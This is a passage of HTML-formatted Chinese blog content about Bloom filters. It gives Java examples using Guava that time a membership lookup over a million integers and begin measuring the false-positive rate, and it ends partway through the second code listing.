class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa93038ec8921125516-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93038ec8921125516-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa93038ec8921125516-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93038ec8921125516-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa93038ec8921125516-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93038ec8921125516-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa93038ec8921125516-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93038ec8921125516-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa93038ec8921125516-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93038ec8921125516-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa93038ec8921125516-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93038ec8921125516-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa93038ec8921125516-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93038ec8921125516-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa93038ec8921125516-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93038ec8921125516-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa93038ec8921125516-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93038ec8921125516-18\">18</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa93038ec8921125516-19\">19</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93038ec8921125516-20\">20</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa93038ec8921125516-21\">21</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93038ec8921125516-22\">22</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa93038ec8921125516-23\">23</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93038ec8921125516-24\">24</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa93038ec8921125516-25\">25</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93038ec8921125516-26\">26</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa93038ec8921125516-27\">27</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa93038ec8921125516-1\"><span class=\"crayon-t\">package</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">bloomfilter</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93038ec8921125516-2\"> </div><div class=\"crayon-line\" id=\"crayon-5b4aa93038ec8921125516-3\"><span class=\"crayon-e\">import </span><span class=\"crayon-v\">com</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">google</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">common</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">hash</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">BloomFilter</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93038ec8921125516-4\"><span class=\"crayon-e\">import </span><span class=\"crayon-v\">com</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">google</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">common</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">hash</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">Funnels</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa93038ec8921125516-5\"><span class=\"crayon-e\">import </span><span class=\"crayon-v\">java</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">nio</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">charset</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">Charset</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93038ec8921125516-6\"> </div><div class=\"crayon-line\" id=\"crayon-5b4aa93038ec8921125516-7\"><span class=\"crayon-m\">public</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">class</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Test</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93038ec8921125516-8\"><span class=\"crayon-h\">    </span><span class=\"crayon-m\">private</span><span class=\"crayon-h\"> </span><span class=\"crayon-m\">static</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">size</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1000000</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa93038ec8921125516-9\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93038ec8921125516-10\"><span class=\"crayon-h\">    </span><span class=\"crayon-m\">private</span><span class=\"crayon-h\"> </span><span class=\"crayon-m\">static</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">BloomFilter</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-t\">Integer</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">bloomFilter</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">BloomFilter</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">create</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">Funnels</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">integerFunnel</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">size</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa93038ec8921125516-11\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93038ec8921125516-12\"><span class=\"crayon-h\">    </span><span class=\"crayon-m\">public</span><span class=\"crayon-h\"> </span><span class=\"crayon-m\">static</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">void</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">main</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">String</span><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">args</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa93038ec8921125516-13\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">size</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-o\">++</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93038ec8921125516-14\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">bloomFilter</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">put</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa93038ec8921125516-15\"><span class=\"crayon-h\">        </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93038ec8921125516-16\"><span class=\"crayon-h\">        </span><span class=\"crayon-t\">long</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">startTime</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">System</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">nanoTime</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-c\">// 获取开始时间</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa93038ec8921125516-17\"><span class=\"crayon-h\">        </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93038ec8921125516-18\"><span class=\"crayon-h\">        </span><span class=\"crayon-c\">//判断这一百万个数中是否包含29999这个数</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa93038ec8921125516-19\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">bloomFilter</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">mightContain</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">29999</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93038ec8921125516-20\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">System</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">out</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">println</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"命中了\"</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa93038ec8921125516-21\"><span class=\"crayon-h\">        </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93038ec8921125516-22\"><span class=\"crayon-h\">        </span><span class=\"crayon-t\">long</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">endTime</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">System</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">nanoTime</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\">   </span><span class=\"crayon-c\">// 获取结束时间</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa93038ec8921125516-23\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93038ec8921125516-24\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">System</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">out</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">println</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"程序运行时间： \"</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">endTime</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">startTime</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"纳秒\"</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa93038ec8921125516-25\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93038ec8921125516-26\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa93038ec8921125516-27\"><span class=\"crayon-sy\">}</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0046 seconds] -->\r\n<p>输出如下所示</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa93038ecc736436267\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n命中了\r\n程序运行时间： 219386纳秒</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa93038ecc736436267-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93038ecc736436267-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa93038ecc736436267-1\">命中了</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93038ecc736436267-2\">程序运行时间：<span class=\"crayon-h\"> </span><span class=\"crayon-cn\">219386</span>纳秒</div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>也就是说，判断一个数是否属于一个百万级别的集合，只要0.219ms就可以完成，性能极佳。</p>\n<h5 id=\"误判率的一些概念\">(3)误判率的一些概念</h5>\n<p>首先，我们先不对误判率做显示的设置，进行一个测试，代码如下所示</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa93038ed1152203686\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\npackage bloomfilter;\r\n\r\nimport java.util.ArrayList;\r\nimport java.util.List;\r\n\r\nimport com.google.common.hash.BloomFilter;\r\nimport com.google.common.hash.Funnels;\r\n\r\npublic class Test {\r\n    private static int size = 1000000;\r\n\r\n    private static BloomFilter&lt;Integer&gt; bloomFilter = BloomFilter.create(Funnels.integerFunnel(), size);\r\n\r\n    public static void main(String[] args) {\r\n        for (int i = 0; i &lt; size; i++) {\r\n            bloomFilter.put(i);\r\n        }\r\n        List&lt;Integer&gt; list = new ArrayList&lt;Integer&gt;(1000);  \r\n        \r\n        //故意取10000个不在过滤器里的值，看看有多少个会被认为在过滤器里\r\n        for (int i = size + 10000; i &lt; size + 20000; i++) {  \r\n            if (bloomFilter.mightContain(i)) {  \r\n                list.add(i);  \r\n            }  \r\n        }  \r\n        System.out.println(\"误判的数量：\" + list.size()); \r\n\r\n    }\r\n}</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa93038ed1152203686-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93038ed1152203686-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa93038ed1152203686-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93038ed1152203686-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa93038ed1152203686-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93038ed1152203686-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa93038ed1152203686-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93038ed1152203686-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa93038ed1152203686-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93038ed1152203686-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa93038ed1152203686-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93038ed1152203686-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa93038ed1152203686-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93038ed1152203686-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa93038ed1152203686-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93038ed1152203686-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa93038ed1152203686-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93038ed1152203686-18\">18</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa93038ed1152203686-19\">19</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93038ed1152203686-20\">20</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa93038ed1152203686-21\">21</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93038ed1152203686-22\">22</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa93038ed1152203686-23\">23</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93038ed1152203686-24\">24</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa93038ed1152203686-25\">25</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93038ed1152203686-26\">26</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa93038ed1152203686-27\">27</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93038ed1152203686-28\">28</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa93038ed1152203686-29\">29</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa93038ed1152203686-1\"><span class=\"crayon-t\">package</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">bloomfilter</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93038ed1152203686-2\"> </div><div class=\"crayon-line\" id=\"crayon-5b4aa93038ed1152203686-3\"><span class=\"crayon-e\">import </span><span class=\"crayon-v\">java</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">util</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">ArrayList</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93038ed1152203686-4\"><span class=\"crayon-e\">import </span><span class=\"crayon-v\">java</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">util</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">List</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa93038ed1152203686-5\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93038ed1152203686-6\"><span class=\"crayon-e\">import </span><span class=\"crayon-v\">com</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">google</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">common</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">hash</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">BloomFilter</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa93038ed1152203686-7\"><span class=\"crayon-e\">import </span><span class=\"crayon-v\">com</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">google</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">common</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">hash</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">Funnels</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93038ed1152203686-8\"> </div><div class=\"crayon-line\" id=\"crayon-5b4aa93038ed1152203686-9\"><span class=\"crayon-m\">public</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">class</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Test</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93038ed1152203686-10\"><span class=\"crayon-h\">    </span><span class=\"crayon-m\">private</span><span class=\"crayon-h\"> </span><span class=\"crayon-m\">static</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">size</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1000000</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa93038ed1152203686-11\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93038ed1152203686-12\"><span class=\"crayon-h\">    </span><span class=\"crayon-m\">private</span><span class=\"crayon-h\"> </span><span class=\"crayon-m\">static</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">BloomFilter</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-t\">Integer</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">bloomFilter</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">BloomFilter</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">create</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">Funnels</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">integerFunnel</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">size</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa93038ed1152203686-13\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93038ed1152203686-14\"><span class=\"crayon-h\">    </span><span class=\"crayon-m\">public</span><span class=\"crayon-h\"> </span><span class=\"crayon-m\">static</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">void</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">main</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">String</span><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">args</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa93038ed1152203686-15\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">size</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-o\">++</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93038ed1152203686-16\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">bloomFilter</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">put</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa93038ed1152203686-17\"><span class=\"crayon-h\">        </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93038ed1152203686-18\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">List</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-t\">Integer</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">list</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">ArrayList</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-t\">Integer</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">1000</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line\" id=\"crayon-5b4aa93038ed1152203686-19\"><span class=\"crayon-h\">        </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93038ed1152203686-20\"><span class=\"crayon-h\">        </span><span class=\"crayon-c\">//故意取10000个不在过滤器里的值，看看有多少个会被认为在过滤器里</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa93038ed1152203686-21\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> 